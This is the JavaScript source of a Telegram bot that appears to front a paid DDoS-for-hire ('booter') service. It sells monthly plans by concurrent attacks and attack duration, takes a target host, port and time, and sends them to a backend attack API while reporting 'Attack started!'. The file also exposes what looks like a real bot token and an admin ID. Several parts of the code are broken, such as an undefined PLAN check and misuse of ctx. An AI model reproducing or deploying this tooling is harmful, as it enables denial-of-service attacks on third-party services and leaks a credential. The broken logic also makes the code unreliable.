const { Telegraf, Markup } = require('telegraf'),
    request = require('request')

let users = []


let USERS = [
    ['1987642016', 'start', 0, 2], [ // PLAN DATABASE
    ],
    ADMIN_ID = "1987642016", // ADMIN ID
    API_URL = "", // API DOMAIN (your-api.com)
    BLACK_LIST = ['8.8.8.8', '127.0.0.1'] // BLACKLIST

const SETTINGS = {
    BOT_NAME: "deathbbos_bot",
    TOKEN: "6304740874:AAH9WKzlNy6FH56I_m3apm22kuMUWEaUzIQ",
    OWNER_TAG: "winterkeith",
    TELEGRAM_LINK: "https://t.me/jestcabin", // TELEGRAM LINK
    TELEGRAM_CHANNEL_ID: -1002026356494 // TELEGRAM CHANNEL ID

}

const buttons = [
    ["🖥Profile", "💵Plans"],
    ["🔫Methods", "🔦Usage"],
    ["✅TOS", "⚙️Commands"],
    ["👤Support"]
]

const bot = new Telegraf(SETTINGS.TOKEN)

bot.command('start', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
                if (users.indexOf('ctx.from.id') === -1) {
                    await users.push(ctx.from.id)
                    await bot.telegram.sendMessage(ADMIN_ID, "✅ New user - "+ctx.from.id)
                }
    await ctx.reply(
        `❗️Hello, ${ctx.from.first_name}. 
Welcome to [${SETTINGS.BOT_NAME}]

Commands list: /help
Restart bot: /start`,
        Markup.keyboard(buttons).oneTime().resize()
    )
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('✅TOS', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅ TOS:
1. Do not attack dstats.
2. Respect stuff.`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.action('check', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
            await ctx.reply('✅You can use the bot!', Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply('❗You have not joined to channel.',
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
            ]))
        }
    })
})

bot.command('id', async (ctx) => {
    await ctx.reply(`✅ ID:
One: ${ctx.from.id}
Two: ${ctx.chat.id}`)
});

bot.hears('check', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
            await ctx.reply(`✅ Commands: `, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('⚙️Commands', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('💵Plans', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅ Plans:

START - [$20 / monthly]
2 concurrents, 160s boot time.

VIP - [$35 / monthly]
3 concurrents, 200s boot time.
VIP methods.

PREMIUM + [$50 / monthly]
5 concurrents, 400s boot time.
VIP methods.`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('🔫Methods', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅ Methods list:

Usage: /method (HOST) (PORT) (DURATION)
Example: /tls google.com 443 60

/https: 
/tls:
/bypass: [VIP]
/browser: [VIP]
/browser-vip: [VIP]`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('🔦Usage', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅ instruction:

Use: /method ip port attack_time`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.hears('👤Support', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    await ctx.reply(`✅ Support - @${SETTINGS.OWNER_TAG}`, Markup.keyboard(buttons).oneTime().resize())
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.command('tls', async (ctx) => { //NOT VIP METHOD
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    let sent = true
    let data = [ctx.from.id, ctx.message.text.split(' ')[1], ctx.message.text.split(' ')[2], ctx.message.text.split(' ')[3]]
        getRunConc(ctx.from.id).then(async function (CONC) {
            getMaxConc(ctx.from.id).then(async function (MAX_CONC) {
                    if (CONC <= MAX_CONC) {
                        if (await checkVip(ctx.from.id) === true) {
                            if (ctx.message.text.split(' ').length === 4) {
                                getMaxTime(data[0]).then(async function (MAX_TIME) {
                                    if (data[3] <= MAX_TIME) {
                                        if (data[2] >= 0 && data[2] <= 65536) {
                                            for (let i = 0; i < BLACK_LIST.length; i++) {
                                                if (data[1] === BLACK_LIST[i]) {
                                                    await ctx.reply("❗️Blacklisted target!", Markup.keyboard(buttons).oneTime().resize())
                                                    sent = false
                                                }
                                            }
                                            if (sent === true) {
                                               await request.get(`https://${API_URL}/api/attack?key=&host=${ctx.message.text.split(' ')[1]}&port=${ctx.message.text.split(' ')[2]}&time=${ctx.message.text.split(' ')[3]}&method=TCP`)
                                                await addConc(ctx.from.id)
                                                await ctx.reply(`💣Attack started!`, Markup.keyboard(buttons).oneTime().resize())
                                                await sleep(data[3]*1000)
                                                await delConc(ctx.from.id)
                                                await ctx.reply(`❗️Attack finished.`)
                                            }
                                        } else {
                                            await ctx.reply("❗️ Invalid port! (1-65536)", Markup.keyboard(buttons).oneTime().resize())
                                            sent = false
                                        }
                                    } else {
                                        await ctx.reply(`❗️Invalid duration. Your max boot time - (${MAX_TIME})`, Markup.keyboard(buttons).oneTime().resize())
                                        sent = false
                                    }
                                });
                            } else {
                                await ctx.reply(`❗️Usage: /tls (HOST) (PORT) (DURATION)`, Markup.keyboard(buttons).oneTime().resize())
                                sent = false
                            }
                        } else {
                            await ctx.reply(`❗️Please buy a subscription from @${SETTINGS.OWNER_TAG}!`, Markup.keyboard(buttons).oneTime().resize())
                            sent = false
                        }
                    } else {
                        await ctx.reply(`❗️You can only launch [${MAX_CONC}] simultaneous attacks!`, Markup.keyboard(buttons).oneTime().resize())
                        sent = false
                    }
            })
        })
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

if (PLAN === "LEGENDARY" ||  "GOD" || "INVISCIBLE" || "UNSTOPPABLE") {

bot.command('browser-vip', async (ctx) => { //VIP
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    let sent = true
    let data = [ctx.from.id, ctx.message.text.split(' ')[1], ctx.message.text.split(' ')[2], ctx.message.text.split(' ')[3]]
    getPlan(ctx.from.id).then(async function (PLAN) {
        getRunConc(ctx.from.id).then(async function (CONC) {
            getMaxConc(ctx.from.id).then(async function (MAX_CONC) {
                if (PLAN === "vip") {
                    if (CONC <= MAX_CONC) {
                        if (await checkVip(ctx.from.id) === true) {
                            if (ctx.message.text.split(' ').length === 4) {
                                getMaxTime(data[0]).then(async function (MAX_TIME) {
                                    if (data[3] <= MAX_TIME) {
                                        if (data[2] >= 0 && data[2] <= 65536) {
                                            for (let i = 0; i < BLACK_LIST.length; i++) {
                                                if (data[1] === BLACK_LIST[i]) {
                                                    await ctx.reply("❗️Blacklisted target!", Markup.keyboard(buttons).oneTime().resize())
                                                    sent = false
                                                }
                                            }
                                            if (sent === true) {
                                                await request.get(`https://${API_URL}/api/attack?key=&host=${ctx.message.text.split(' ')[1]}&port=${ctx.message.text.split(' ')[2]}&time=${ctx.message.text.split(' ')[3]}&method=TCP`)
                                                await addConc(ctx.from.id)
                                                await ctx.reply(`💣Attack successfully started.`, Markup.keyboard(buttons).oneTime().resize())
                                                await sleep(data[3]*1000)
                                                await delConc(ctx.from.id)
                                                await ctx.reply(`❗️Attac finished`)
                                            }
                                        } else {
                                            await ctx.reply("❗️Wrong port. (1-65536)", Markup.keyboard(buttons).oneTime().resize())
                                            sent = false
                                        }
                                    } else {
                                        await ctx.reply(`❗️Invalid duration. Your max boot time - (${MAX_TIME})`, Markup.keyboard(buttons).oneTime().resize())
                                        sent = false
                                    }
                                });
                            } else {
                                await ctx.reply(`❗️Usage: /browser-vip (HOST) (PORT) (DURATION)`, Markup.keyboard(buttons).oneTime().resize())
                                sent = false
                            }
                        } else {
                            await ctx.reply(`❗️Please buy a subscription from @${SETTINGS.OWNER_TAG}!`, Markup.keyboard(buttons).oneTime().resize())
                            sent = false
                        }
                    } else {
                        await ctx.reply(`❗️You can only launch [${MAX_CONC}] simultaneous attacks!`, Markup.keyboard(buttons).oneTime().resize())
                        sent = false
                    }
                } else {
                    await ctx.reply(`❗️This is the VIP method.!`, Markup.keyboard(buttons).oneTime().resize())
                    sent = false
                }
            })
        })
    })
        } else {
            await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});
bot.command('admin', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        await ctx.reply(`💣 List of ADMIN commands:

/listusers: List of users.
/adduser: Add a user.
/deluser: Delete a user.`)
    } else {
        await ctx.reply(`❗️ You do not have administrator rights!`, Markup.keyboard(buttons).oneTime().resize())
    }
});

bot.command('adduser', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        if (ctx.message.text.split(' ').length === 3) {
                addUser(ctx.message.text.split(' ')[1], ctx.message.text.split(' ')[2])
                await ctx.reply(`✅ User ID ${ctx.message.text.split(' ')[1]} with a plan ${ctx.message.text.split(' ')[2]} has been added successfully!`)
        } else {
            await ctx.reply(`❗️Usage: /adduser user_id tariff`)
        }
    } else {
        await ctx.reply(`❗️You do not have administrator rights!`, Markup.keyboard(buttons).oneTime().resize())
    }
});

bot.command('deluser', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
        if (ctx.message.text.split(' ').length === 2) {
            let daaa = true
            for (let i = 0; i < USERS.length; i++) {
                if (ctx.message.text.split(' ')[1] === USERS[i][0]) {
                    daaa = true
                }
            }
            if (daaa === true) {
                await delUser(ctx.message.text.split(' ')[1])
                await ctx.reply(`✅ Пользователь под ID ${ctx.message.text.split(' ')[1]} был успешно удален!`)
            } else {
                await ctx.reply(`❗️Пользователь не был найден!`)
            }
        } else {
            await ctx.reply(`❗️Использование: /deluser айди_пользователя`)
        }
    } else {
        await ctx.reply(`❗️У вас нету прав администратора!`, Markup.keyboard(buttons).oneTime().resize())
    }
});

bot.command('listusers', async (ctx) => {
    if (ctx.from.id === ADMIN_ID) {
            let listusers = ""
            for (let i = 0; i < USERS.length; i++) {
                if (USERS[i] !== '') {
                    listusers += "- "+USERS[i][0] + ":" + USERS[i][1] + "\n"
                }
            }
            await ctx.reply(`✅ a list of users:\n\n${listusers}`)
    } else {
        await ctx.reply(`❗️You do not have administrator rights!`, Markup.keyboard(buttons).oneTime().resize())
    }
});

bot.hears('🖥Profile', async (ctx) => {
    checkSub(ctx.from.id).then(async function (Sub) {
        if (Sub === true) {
    getPlan(ctx.from.id).then(async function (PLAN) {
    getMaxTime(ctx.from.id).then(async function (MAX_TIME) {

        await ctx.reply(`✏️ Your profile:

- ID: ${ctx.from.id}
- Username: [${ctx.from.first_name}]
- Access: [${checkVip(ctx.from.id) ? "False" : "True"}]
- Plan: [${PLAN}]
- Max boot time: [${MAX_TIME}]`, Markup.keyboard(buttons).oneTime().resize())
    });
});
        } else {
          await ctx.reply(`✅ Please join to ${SETTINGS.TELEGRAM_LINK} to continue using the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.url('❗Join channel', SETTINGS.TELEGRAM_LINK)],
                    [Markup.button.callback('⚙️Check', 'check')]
                ])
            )
        }
    })
});

bot.launch()

async function getMaxTime(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i][0]) {
            if (USERS[i][1] === "start") {
                return 300;
            } else if (USERS[i][1] === "vip") {
                return 600;
            } else if (USERS[i][1] === "super") {
            	return 1200;
            }
        }
    }
    return 0;
}

async function getMaxConc(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i][0]) {
            return USERS[i][3]
        }
    }
    return false
}

async function delConc(id) {
    await delUser(id)
    getRunConc(id).then(async function (CONC) {
        getPlan(id).then(async function (PLAN) {
            USERS.splice(-1, 0, ...USERS.splice(-1, 1, [id, PLAN, CONC--]))
        })
    })
}

async function checkSub(id) {
    const member = await bot.telegram.getChatMember(SETTINGS.TELEGRAM_CHANNEL_ID, id)

    if (member.status === "member" || member.status === "creator" || member.status === "administrator") {
        return true
    }
    return false
}

async function addConc(id) {
    await delUser(id)
    getRunConc(id).then(async function (CONC) {
        getPlan(id).then(async function (PLAN) {
            USERS.splice(-1, 0, ...USERS.splice(-1, 1, [id, PLAN, CONC++]))
        })
    })
}

async function getRunConc(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i][0]) {
            return USERS[i][2]
        }
    }
    return false
}

async function getPlan(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i][0]) {
            return USERS[i][1]
        }
    }
    return false
}

async function addUser(id, price) {
    USERS.splice(-1, 0, ...USERS.splice(-1, 1, [id, price, 0]))
    for (let i = 0; i < users.length; i++) {
        if (ctx.message.text.split(' ')[1] === users[i]){
            bot.telegram.sendMessage(Number(ctx.message.text.split(' ')[1]), '❗️The administrator has given you access!')
        }
    }
}

async function delUser(id) {
    let SUCCESS = false
    for (let i = 0; i < USERS.length; i++) {
        if (id === USERS[i][0]) {
            USERS.splice(i, 1)
            SUCCESS = true
        }
    }
    if (SUCCESS === true) {
        for (let i = 0; i < users.length; i++) {
            if (id === users[i]) {
                bot.telegram.sendMessage(id, '❗️The administrator has taken away your access!')
            }
        }
    }
}

async function checkVip(id) {
    for (let i = 0; i < USERS.length; i++) {
        if (id.toString() === USERS[i][0]) {
            return true
        }
    }
    return false
}

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

console.log(`${SETTINGS.BOT_NAME} | Бот запущен!`)